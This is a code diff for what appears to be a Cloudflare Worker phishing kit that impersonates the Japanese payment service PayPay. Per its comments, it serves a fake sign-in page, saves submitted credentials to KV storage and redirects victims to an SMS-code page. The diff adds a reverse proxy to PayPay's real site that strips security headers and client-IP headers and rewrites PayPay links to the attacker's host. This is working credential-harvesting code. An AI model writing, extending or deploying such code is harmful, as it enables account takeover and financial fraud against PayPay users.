@@ -4,7 +4,9 @@
 // /admin で管理画面
 // 16文字IDパスは既存の docs/signin.html を配信
 // /api/login で credential を KV に保存して sms.html へリダイレクト
+// 未知のパスは PayPay にプロキシ
 
+const TARGET_ORIGIN = "https://www.paypay.ne.jp";
 const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
 const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";
 const SIGNIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signin.html";
@@ -13,6 +15,7 @@ const SMS_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
+    const workerHost = url.host;
 
     if (url.pathname === "/" || url.pathname === "") {
       return Response.redirect(url.origin + "/admin", 302);
@@ -68,7 +71,7 @@ export default {
       return fetchStatic(SIGNIN_SOURCE);
     }
 
-    return new Response("Not found: " + url.pathname, { status: 404 });
+    return proxy(request, env, workerHost);
   },
 };
 
@@ -82,6 +85,37 @@ async function fetchStatic(source) {
     }
   } catch {}
   return new Response("Fetch failed", { status: 502 });
+}
+
+async function proxy(request, env, workerHost) {
+  const url = new URL(request.url);
+  const targetUrl = TARGET_ORIGIN + url.pathname + url.search;
+
+  const headers = new Headers(request.headers);
+  headers.set("Host", "www.paypay.ne.jp");
+  headers.delete("cf-connecting-ip");
+  headers.delete("cf-ray");
+  headers.delete("cf-visitor");
+
+  const res = await fetch(targetUrl, {
+    method: request.method,
+    headers,
+    body: (request.method !== "GET" && request.method !== "HEAD") ? request.body : undefined,
+    redirect: "follow",
+  });
+
+  const newHeaders = new Headers(res.headers);
+  newHeaders.delete("content-security-policy");
+  newHeaders.delete("x-frame-options");
+
+  const contentType = newHeaders.get("content-type") || "";
+  if (contentType.includes("text/html")) {
+    let html = await res.text();
+    html = html.replace(/https?:\/\/www\.paypay\.ne\.jp/g, `https://${workerHost}`);
+    return new Response(html, { status: res.status, headers: newHeaders });
+  }
+
+  return new Response(res.body, { status: res.status, headers: newHeaders });
 }
 
 async function handleStore(request, env) {
